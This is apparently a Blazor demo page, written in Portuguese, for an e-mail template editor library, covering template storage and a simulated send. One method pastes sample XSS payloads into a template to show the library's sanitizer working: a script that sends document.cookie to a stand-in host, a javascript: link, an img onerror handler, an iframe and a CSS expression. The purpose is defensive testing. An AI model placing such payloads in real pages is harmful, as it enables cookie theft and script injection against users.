@*
    Demonstração completa do módulo de e-mail: editor (BBiEmail) + persistência
    de templates (IRepositorioTemplateEmail, em memória nesta demo) + envio
    (transporte simulado, grava .eml). Harness — não faz parte da biblioteca.
*@
@page "/email"
@rendermode InteractiveServer
@using BBiCore.Email
@using DemoBBiCore.Modelos
@inject IRepositorioTemplateEmail Repositorio

<PageTitle>BBiCore — e-mail</PageTitle>

<h1>BBiCore — editor de e-mail</h1>

<p class="intro">
    Editor completo. O <strong>acervo</strong> já vem semeado (logo, rodapé, selo, PDF e um anexo de
    <strong>caminho dinâmico</strong>) — escolha-os nas listas, em vez de subir arquivo.
    <br />
    Três regras da biblioteca para observar: um <strong>rascunho não pode ser enviado</strong> pelos
    sistemas (só o "enviar teste" passa); usar o <strong>PDF como cabeçalho é recusado</strong> (papel
    de corpo exige imagem); e o HTML é <strong>sanitizado ao salvar</strong> — o botão abaixo mostra isso.
</p>

<div class="tpl-barra">
    <label class="tpl-rotulo">Templates salvos:</label>
    <select class="tpl-select" @onchange="AoSelecionar" value="@_selecionado">
        <option value="">(novo template)</option>
        @foreach (string nome in _nomes)
        {
            <option value="@nome">@nome</option>
        }
    </select>
    <button type="button" class="tpl-btn" @onclick="Novo">Novo</button>
    <button type="button" class="tpl-btn tpl-btn--teste" @onclick="ColarHtmlPerigoso">
        Colar HTML com script (testar sanitização)
    </button>
    @if (!string.IsNullOrEmpty(_selecionado))
    {
        <button type="button" class="tpl-btn tpl-btn--rem" @onclick="Excluir">Excluir</button>
    }
</div>

<BBiEmail DestinosDoRascunho="DestinoRascunho.Bytes | DestinoRascunho.Arquivo"
          Template="_template"
          TipoDados="typeof(PedidoCliente)"
          Motor="_motor"
          DadosExemplo="_exemplo"
          OnSalvo="Salvar"
          OnEnviado="Enviado" />

@if (_mensagem is not null)
{
    <p class="status">@_mensagem</p>
}

@code {
    /// <summary>Motor configurado com variáveis do sistema (chave/valor) e os computados padrão.</summary>
    private readonly MotorTemplate _motor = new(new Dictionary<string, string>
    {
        ["NomeEmpresa"] = "Banco Exemplo",
        ["TelefoneSac"] = "0800 123 4567",
        ["UrlPortal"] = "https://portal.exemplo.com",
        ["EmailGenerico"] = "copias@bancoexemplo.com"
    });

    /// <summary>Objeto de exemplo usado no preview e no envio de teste.</summary>
    private readonly PedidoCliente _exemplo = new()
    {
        NomeCliente = "João Silva",
        EmailCliente = "joao.silva@exemplo.com",
        NumeroPedido = 4821,
        Total = 1234.50m,
        DataPedido = DateTime.Now,
        Status = "Aprovado"
    };

    /// <summary>Template em edição.</summary>
    private ITemplateEmail _template = NovoTemplate();

    /// <summary>Nomes de templates salvos.</summary>
    private IReadOnlyList<string> _nomes = [];

    /// <summary>Nome do template selecionado na lista ("" = novo).</summary>
    private string _selecionado = string.Empty;

    /// <summary>Mensagem de status exibida após salvar/enviar/excluir.</summary>
    private string? _mensagem;

    /// <summary>Carrega a lista de templates ao abrir a página.</summary>
    protected override async Task OnInitializedAsync()
        => await RecarregarNomes();

    /// <summary>
    /// Cola no corpo um HTML que MISTURA conteúdo legítimo com código malicioso. Ao salvar, a
    /// biblioteca remove só o que executa código — o botão de link, a tabela, a imagem e o estilo
    /// permanecem — e avisa na tela o que saiu (o log também registra).
    /// </summary>
    private void ColarHtmlPerigoso()
    {
        _template.OrigemCriacao = OrigemCriacaoTemplate.Avancado;

        _template.Corpo =
            "<table bgcolor=\"#f6f8fb\" cellpadding=\"12\" style=\"border-collapse:collapse;width:100%\">" +
            "<tr><td align=\"center\">" +
            "<h2 style=\"color:#cc092f\">Olá, {{NomeCliente}}!</h2>" +
            "<p>O seu pedido <b>{{NumeroPedido}}</b> está <b>{{Status}}</b>.</p>" +

            // LEGÍTIMO — este botão de link DEVE sobreviver à sanitização:
            "<a href=\"https://sistema.interno/pedido/{{NumeroPedido}}\" " +
            "style=\"background:#cc092f;color:#ffffff;padding:12px 28px;border-radius:4px;display:inline-block\">" +
            "clique aqui para acessar o Registro</a>" +

            // MALICIOSO — tudo abaixo DEVE ser removido:
            "<script>fetch('http://malicioso/' + document.cookie)</script>" +
            "<a href=\"javascript:alert('roubei')\">link que executa código</a>" +
            "<img src=\"x\" onerror=\"alert('xss')\">" +
            "<iframe src=\"http://malicioso\"></iframe>" +
            "<div style=\"width:100%;background:expression(alert(1))\">estilo perigoso</div>" +

            "</td></tr></table>";

        _mensagem = "HTML colado no modo avançado. Salve o rascunho e veja o que a biblioteca remove.";
    }

    /// <summary>Cria um template novo, já com marcadores de exemplo.</summary>
    /// <returns>Template inicial.</returns>
    private static ITemplateEmail NovoTemplate()
        => new TemplateEmailDto
        {
            Nome = string.Empty,
            Assunto = "Pedido {{NumeroPedido}} — {{Sistema.Saudacao}}, {{NomeCliente}}",
            Destinatarios = "{{EmailCliente}}",
            Cc = "{{EmailGenerico}}",
            TipoDadosNome = nameof(PedidoCliente),
            OrigemCriacao = OrigemCriacaoTemplate.Normal,
            Classificacao = ClassificacaoEmail.Interno
        };

    /// <summary>Recarrega os nomes de templates do repositório.</summary>
    private async Task RecarregarNomes()
        => _nomes = await Repositorio.ListarNomesAsync(SituacaoTemplate.Publicado);

    /// <summary>Começa um template novo, em branco.</summary>
    private void Novo()
    {
        _template = NovoTemplate();
        _selecionado = string.Empty;
        _mensagem = null;
    }

    /// <summary>Carrega o template selecionado na lista.</summary>
    /// <param name="e">Evento de mudança do select.</param>
    private async Task AoSelecionar(ChangeEventArgs e)
    {
        _selecionado = e.Value?.ToString() ?? string.Empty;
        _mensagem = null;

        if (string.IsNullOrEmpty(_selecionado))
        {
            _template = NovoTemplate();
            return;
        }

        ITemplateEmail? achado = await Repositorio.ObterAsync(_selecionado);
        if (achado is not null)
            _template = achado;
    }

    /// <summary>Salva o template no repositório.</summary>
    /// <param name="template">Template montado pelo componente.</param>
    private async Task Salvar(ITemplateEmail template)
    {
        if (string.IsNullOrWhiteSpace(template.Nome))
        {
            _mensagem = "Dê um nome ao template antes de salvar.";
            return;
        }

        await Repositorio.SalvarAsync(template);
        await RecarregarNomes();
        _selecionado = template.Nome;
        _mensagem = $"Template \"{template.Nome}\" salvo.";
    }

    /// <summary>Exclui o template selecionado.</summary>
    private async Task Excluir()
    {
        if (string.IsNullOrEmpty(_selecionado))
            return;

        await Repositorio.ExcluirAsync(_selecionado);
        await RecarregarNomes();
        _mensagem = $"Template \"{_selecionado}\" excluído.";
        Novo();
    }

    /// <summary>Recebe o resultado do envio de teste.</summary>
    /// <param name="resultado">Resultado devolvido pelo serviço de envio.</param>
    private void Enviado(ResultadoEnvio resultado)
        => _mensagem = resultado.Sucesso
            ? "E-mail simulado gerado (.eml) na pasta emails-simulados."
            : $"Envio: {resultado.Mensagem}";
}
